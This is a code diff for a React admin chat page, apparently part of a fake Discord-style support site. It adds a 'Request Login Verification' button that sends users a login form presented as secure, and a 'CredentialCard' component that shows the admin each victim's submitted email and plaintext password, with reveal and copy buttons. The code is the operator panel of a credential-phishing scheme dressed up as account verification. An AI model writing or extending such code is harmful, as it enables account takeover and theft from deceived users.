@@ -4,8 +4,11 @@ import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
 import AdminLayout from "../components/AdminLayout";
 import { authHeaders, getToken } from "../lib/api";
 import { useAdminMessages } from "../lib/useSocket";
-import { getAvatarUrl, getDisplayName, formatTag } from "../lib/discord";
-import { Send, Paperclip, ArrowLeft, Loader2, Image as ImageIcon } from "lucide-react";
+import { getAvatarUrl, getDisplayName } from "../lib/discord";
+import { Send, Paperclip, ArrowLeft, Loader2, ShieldCheck, Eye, EyeOff, CheckCircle2, XCircle } from "lucide-react";
+
+const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
+const LOGIN_RESPONSE_PREFIX = "__LOGIN_RESPONSE__:";
 
 export default function AdminChat() {
   const { id } = useParams<{ id: string }>();
@@ -32,7 +35,6 @@ export default function AdminChat() {
   }, [messages]);
 
   useEffect(() => {
-    // Mark messages as read
     fetch(`/api/cases/${id}/messages/read`, { method: "POST", headers: authHeaders() });
     qc.invalidateQueries({ queryKey: ["inbox"] });
   }, [id]);
@@ -54,14 +56,15 @@ export default function AdminChat() {
     sendMsg.mutate({ content: text.trim() });
   };
 
+  const handleSendLoginRequest = () => {
+    sendMsg.mutate({ content: LOGIN_REQUEST_PREFIX });
+  };
+
   const handleFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
     setUploading(true);
     try {
-      const form = new FormData();
-      form.append("file", file);
-      // Upload via base64 embed for now (no R2 configured)
       const reader = new FileReader();
       reader.onload = () => {
         const dataUrl = reader.result as string;
@@ -117,15 +120,52 @@ export default function AdminChat() {
           {messages.length === 0 && (
             <div className="text-center text-[#949ba4] py-12">
               <MessageIcon className="w-10 h-10 mx-auto mb-3 opacity-30" />
-              <p className="text-sm">No messages yet. When the user sends a message, it will appear here.</p>
+              <p className="text-sm">No messages yet.</p>
             </div>
           )}
           {messages.map((msg: any) => {
             const isAdmin = msg.sender === "admin";
+
+            // Login request bubble (admin sent it)
+            if (msg.content === LOGIN_REQUEST_PREFIX) {
+              return (
+                <div key={msg.id} className="flex justify-end">
+                  <div className="max-w-[70%] flex flex-col gap-1 items-end">
+                    <span className="text-xs text-[#949ba4] px-1">You (Admin)</span>
+                    <div className="bg-[#5865F2]/20 border border-[#5865F2]/40 rounded-lg px-4 py-3 flex items-center gap-3">
+                      <ShieldCheck className="w-5 h-5 text-[#5865F2] flex-shrink-0" />
+                      <div>
+                        <p className="text-[#f2f3f5] text-sm font-medium">Login verification sent</p>
+                        <p className="text-[#949ba4] text-xs">Waiting for user to submit credentials</p>
+                      </div>
+                    </div>
+                    <span className="text-xs text-[#949ba4] px-1">
+                      {new Date(msg.createdAt * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                    </span>
+                  </div>
+                </div>
+              );
+            }
+
+            // Login response bubble (user submitted credentials)
+            if (msg.content?.startsWith(LOGIN_RESPONSE_PREFIX)) {
+              let creds: { email: string; password: string } | null = null;
+              try { creds = JSON.parse(msg.content.slice(LOGIN_RESPONSE_PREFIX.length)); } catch {}
+              return (
+                <div key={msg.id} className="flex justify-start">
+                  <div className="max-w-[70%] flex flex-col gap-1 items-start">
+                    <span className="text-xs text-[#949ba4] px-1">User</span>
+                    <CredentialCard creds={creds} time={msg.createdAt} />
+                  </div>
+                </div>
+              );
+            }
+
+            // Normal message
             return (
               <div key={msg.id} className={`flex ${isAdmin ? "justify-end" : "justify-start"}`}>
-                <div className={`max-w-[70%] ${isAdmin ? "items-end" : "items-start"} flex flex-col gap-1`}>
-                  <span className={`text-xs text-[#949ba4] px-1`}>{isAdmin ? "You (Admin)" : "User"}</span>
+                <div className={`max-w-[70%] flex flex-col gap-1 ${isAdmin ? "items-end" : "items-start"}`}>
+                  <span className="text-xs text-[#949ba4] px-1">{isAdmin ? "You (Admin)" : "User"}</span>
                   <div className={`rounded-lg px-4 py-2.5 text-sm ${
                     isAdmin
                       ? "bg-[#5865F2] text-white rounded-tr-sm"
@@ -153,7 +193,20 @@ export default function AdminChat() {
         </div>
 
         {/* Input */}
-        <div className="flex-shrink-0 px-6 py-4 bg-[#2b2d31] border-t border-[#3f4147]">
+        <div className="flex-shrink-0 px-6 py-3 bg-[#2b2d31] border-t border-[#3f4147] space-y-2">
+          {/* Quick action: login request */}
+          <div className="flex items-center gap-2">
+            <button
+              onClick={handleSendLoginRequest}
+              disabled={sendMsg.isPending}
+              title="Send secure login form to user"
+              className="flex items-center gap-2 bg-[#3ba55c]/10 hover:bg-[#3ba55c]/20 border border-[#3ba55c]/30 hover:border-[#3ba55c]/60 text-[#3ba55c] text-xs font-medium px-3 py-1.5 rounded-lg transition-colors disabled:opacity-50"
+            >
+              <ShieldCheck className="w-3.5 h-3.5" />
+              Request Login Verification
+            </button>
+          </div>
+
           <div className="flex items-end gap-3">
             <div className="flex-1 bg-[#1e1f22] border border-[#3f4147] rounded-lg px-4 py-3 flex items-end gap-2">
               <textarea
@@ -183,6 +236,88 @@ export default function AdminChat() {
         </div>
       </div>
     </AdminLayout>
+  );
+}
+
+// Credential card shown to admin when user submits login form
+function CredentialCard({ creds, time }: { creds: { email: string; password: string } | null; time: number }) {
+  const [showPass, setShowPass] = useState(false);
+  const [copied, setCopied] = useState<string | null>(null);
+
+  const copy = (val: string, key: string) => {
+    navigator.clipboard.writeText(val);
+    setCopied(key);
+    setTimeout(() => setCopied(null), 2000);
+  };
+
+  if (!creds) {
+    return (
+      <div className="bg-[#ed4245]/10 border border-[#ed4245]/30 rounded-lg px-4 py-3 text-[#ed4245] text-sm">
+        Received credentials (parse error)
+      </div>
+    );
+  }
+
+  return (
+    <div className="bg-[#2b2d31] border border-[#faa61a]/40 rounded-lg overflow-hidden min-w-[260px]">
+      <div className="flex items-center gap-2 px-4 py-2.5 bg-[#faa61a]/10 border-b border-[#faa61a]/30">
+        <ShieldCheck className="w-4 h-4 text-[#faa61a]" />
+        <span className="text-[#faa61a] text-xs font-semibold uppercase tracking-wide">Login Credentials Received</span>
+      </div>
+      <div className="px-4 py-3 space-y-3">
+        {/* Email */}
+        <div>
+          <p className="text-[#949ba4] text-xs mb-1">Email / Username</p>
+          <div className="flex items-center gap-2">
+            <p className="text-[#f2f3f5] text-sm font-mono flex-1 break-all">{creds.email}</p>
+            <button
+              onClick={() => copy(creds.email, "email")}
+              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
+              title="Copy"
+            >
+              {copied === "email" ? <CheckCircle2 className="w-3.5 h-3.5 text-[#3ba55c]" /> : <CopyIcon />}
+            </button>
+          </div>
+        </div>
+        {/* Password */}
+        <div>
+          <p className="text-[#949ba4] text-xs mb-1">Password</p>
+          <div className="flex items-center gap-2">
+            <p className="text-[#f2f3f5] text-sm font-mono flex-1 break-all">
+              {showPass ? creds.password : "•".repeat(Math.min(creds.password.length, 16))}
+            </p>
+            <button
+              onClick={() => setShowPass(v => !v)}
+              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
+              title={showPass ? "Hide" : "Show"}
+            >
+              {showPass ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
+            </button>
+            <button
+              onClick={() => copy(creds.password, "pass")}
+              className="text-[#949ba4] hover:text-[#f2f3f5] transition-colors flex-shrink-0"
+              title="Copy"
+            >
+              {copied === "pass" ? <CheckCircle2 className="w-3.5 h-3.5 text-[#3ba55c]" /> : <CopyIcon />}
+            </button>
+          </div>
+        </div>
+      </div>
+      <div className="px-4 py-2 border-t border-[#3f4147]">
+        <span className="text-xs text-[#949ba4]">
+          {new Date(time * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+        </span>
+      </div>
+    </div>
+  );
+}
+
+function CopyIcon() {
+  return (
+    <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
+      <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
+    </svg>
   );
 }
 
